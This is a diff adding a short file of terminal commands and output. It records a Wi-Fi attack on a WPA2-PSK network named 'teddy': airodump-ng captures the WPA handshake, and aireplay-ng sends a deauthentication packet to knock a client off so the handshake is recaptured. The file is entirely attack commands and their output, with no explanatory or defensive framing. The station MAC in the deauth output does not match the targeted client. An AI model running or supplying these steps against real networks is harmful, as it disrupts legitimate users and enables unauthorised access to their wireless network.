@@ -1,0 +1,12 @@
+;
+1> airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0
+ CH  9 ][ Elapsed: 4 s ][ 2007-03-24 16:58 ][ WPA handshake: 00:14:6C:7E:40:80                                                                                                        
+  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID                                                                                                              
+  00:14:6C:7E:40:80   39 100       51      116   14   9  54  WPA2 CCMP   PSK  teddy                                                                                                                                       
+  BSSID              STATION            PWR  Lost  Packets  Probes                                                                                                                                                          
+  00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35     0      116  
+;
+2> aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
+ 11:09:28  Sending DeAuth to station   -- STMAC: [00:0F:B5:34:30:30]
+;
+
